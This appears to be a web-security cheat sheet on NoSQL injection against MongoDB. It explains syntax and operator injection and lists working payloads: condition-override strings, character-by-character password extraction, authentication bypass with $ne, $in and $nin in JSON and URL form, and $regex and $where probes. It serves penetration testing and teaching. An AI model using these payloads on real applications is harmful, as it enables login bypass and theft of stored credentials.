---
title: NoSQL Injection
description: Similar to SQL injection, but targeting databases that don't use traditional relational table structures.
---
Similar to SQL injection, NoSQL injection targets databases that don’t follow traditional relational table structures. If untrusted user input is directly included in a NoSQL query, an attacker may be able to modify the query's logic.

NoSQL injection affects NoSQL database such as MongoDB, Apache Cassandra.

There are two main types of NoSQL injection:

- **Syntax Injection**: Breaking out of the intended query structure to alter its behaviour.
- **Operator Injection**: Injecting NoSQL-specific operators (e.g., `$ne`, `$gt`) to manipulate query results or bypass conditions.

## MongoDB
MongoDB is a NoSQL database that stores data in documents instead of tables. Each document uses a key-value pair structure. e.g.
```json
{
	"_id" : ObjectId("5f077332de2cdf808d26cd74"), 
	"username" : "lphillips", 
	"first_name" : "Logan", 
	"last_name" : "Phillips", 
	"age" : "65", 
	"email" : "lphillips@example.com" 
}
```
Documents are grouped into collections, and multiple collections form a database.

### Querying database
```
['last_name' => 'Sandler']
```

```
['gender' => 'male', 'last_name' => 'Phillips']
```

```
['age' => ['$lt'=>'50']]
```

### Query Operators
- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.

[MongoDB Operator Reference](https://www.mongodb.com/docs/manual/reference/operator/query/)
## Exploit
### Syntax Injection
**Testing how the application parses and handle unexpected input**

Injecting in the url:
```
'"`{ ;$Foo} $Foo \xYZ
```

Injecting in json:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Fuzzing individual characters
```
'
"
\
{
}
[
]
:
,
$
.
;
(
)

```

**Testing conditional behaviour**

The backend my run something like:
```js
this.category == 'Gifts' && this.limit == 3
```

Overriding existing conditions
```
' && 1 == 1
' && '1' == '1
' || 1 == 1
' || '1' == '1
' || 1 || '
' || '1' == '1
```

 **Extract the password character by character.**
```css
admin' && this.password[0] == 'a' || 'a'=='b
```

**Check if password contains digits**
```css
admin' && this.password.match(/\d/) || 'a'=='b
```
### Operator Injection

#### `$ne`

```json
{
	"username": "admin",
	"password": {
		"$ne": "xyz"
	}
}
```

```css
username=admin&password[$ne]=xyz
```

#### `$in`
```json
{
	"username": {
		"$in":[
			"admin",
			"ADMIN"
		]
	},
	
	"password":{
		"$ne": "xyz"
	}
}
```

```css
username[$in][]=admin&username[$in][]=ADMIN&password[$ne]=xyz
```

#### `$nin`
```json
{
	"username":{
		"$nin":[
			"admin",
			"ADMIN",
			"wiener"
		]
	},

	"password":{
		"$ne": "xyz"
	}
}
```

```css
username[$nin][]=admin&username[$nin][]=ADMIN&username[$nin][]=wiener&password[$ne]=xyz
```

####  `$regex`

Start with `s`:
```json
"$regex": "^s"
```

Character length:
```json
"$regex": "^.{7}$"
```

Guessing word
```json
"$regex": "^c.......$"
```

#### `$where`

Return first object and first character is `a`
```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Find length
```json
"$where":"Object.keys(this)[0].length == 1"
```

Finding the value 
```json
"$where": "this[Object.keys(this)[4]][0] == 'a'"
```


## Resources
- [MongoDB Operator Reference](https://www.mongodb.com/docs/manual/reference/operator/query/)
- [HackTricks NoSQL](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
- [Exploit Notes NoSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/nosql-injection/)
